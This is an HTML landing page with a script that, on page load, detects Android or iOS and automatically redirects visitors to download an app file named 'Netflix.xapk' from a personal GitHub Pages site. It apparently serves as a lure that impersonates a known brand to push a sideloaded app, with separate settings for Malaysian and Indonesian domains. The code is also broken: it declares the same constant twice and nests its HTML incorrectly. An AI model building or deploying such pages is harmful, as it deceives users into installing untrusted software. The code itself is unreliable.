<!DOCTYPE html>
<head>
    <title>Testing - Home Page</title>
    <html lang="en">
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, target-densitydpi=device-dpi, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
        <meta name="description" content="Redirecting To Download Page...">
        <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css">
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
        <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/js/bootstrap.min.js"></script>
        <style>
            body {
                background-size: 100% 100%;
                min-height: 1200px;
                background-repeat: no-repeat;
                background-color: black;
            }
        </style>
    </head>

    <body bgcolor="#000000">
        <!--brand iamge-->
        <div class="row" style="margin-top:32px;margin-bottom: 32px;">
            <div class="col-md-3"></div>
            <div class="col-md-6">
                <img style="max-width: 100%;max-height: 100%; display: block; margin:auto;margin-top:32px;text-align:center;" src="https://github.com/kelvinheng/test.github.io/blob/main/Resources/logo.PNG">
            </div>
            <div class="col-md-3"></div>
        </div>

        <!--landing message-->
        <h2 style="text-align:center;margin:32px;color:white;">
            Thank you for your patient,</br>
            </br>
            Redirecting to download page</br>
        </h2>
    </body>

    <script>
  const INDON_DOMAIN_LIST = ['testing.com','testing1.com'];
  function checkIndonDomain(){
      let url = window.location.href
      for(let i =0; i<INDON_DOMAIN_LIST.length; i++){
          if(url.indexOf(INDON_DOMAIN_LIST[i]) > -1){
              return true;
          }
      }
      return false
  }
  const INDON_DOMAIN_FLAG = checkIndonDomain();

  const DOMAIN = 'kelvinheng.github.io/test.github.io'
  // App name setting
  const APP_NAME_MSIA = "Netflix";
  const APP_NAME_INDO = "Netflix";
  const APP_NAME = INDON_DOMAIN_FLAG ? APP_NAME_INDO : APP_NAME_MSIA;
  const APK_NAME = `${APP_NAME.charAt(0).toUpperCase()}${APP_NAME.slice(1)}.xapk`;
  const ANDROID_PACKAGE_NAME = `com.${APP_NAME}`;
  const IOS_URL_SCHEME = `${APP_NAME}://`;
  const IOS_URL_DOWNLOAD_MSIA = 'https://kelvinheng.github.io/test.github.io/download.html';
  const IOS_URL_DOWNLOAD_INDO = 'https://kelvinheng.github.io/test.github.io/download.html';
  const IOS_URL_DOWNLOAD = INDON_DOMAIN_FLAG ? IOS_URL_DOWNLOAD_INDO : IOS_URL_DOWNLOAD_MSIA;
  const ANDROID_URL_DOWNLOAD = `https://${DOMAIN}/${APK_NAME}`;
  const ANDROID_URL_DOWNLOAD = `https://${DOMAIN}/${APK_NAME}`;

  function openApp(){
      let os = getMobileOperatingSystem();
      if(os === 'iOS'){
          setTimeout(function () { window.location = IOS_URL_DOWNLOAD; }, 25);
          window.location = IOS_URL_SCHEME
      } else {
          let url_schemae = ANDROID_URL_DOWNLOAD
          let appWindow = window.location.replace(url_schemae);
          setTimeout( function () {if (appWindow) {
              appWindow.location = ANDROID_URL_DOWNLOAD;
                  }
          },1000);
      }
  }
  function getMobileOperatingSystem() {
      let userAgent = navigator.userAgent || navigator.vendor || window.opera;

      if (/android/i.test(userAgent)) {
          return "Android";
      }
      if (/iPad|iPhone|iPod/.test(userAgent) && !window.MSStream) {
          return "iOS";
      }
      return "others"
  }
  //redirect to destination url
  window.onload = openApp();
    </script>
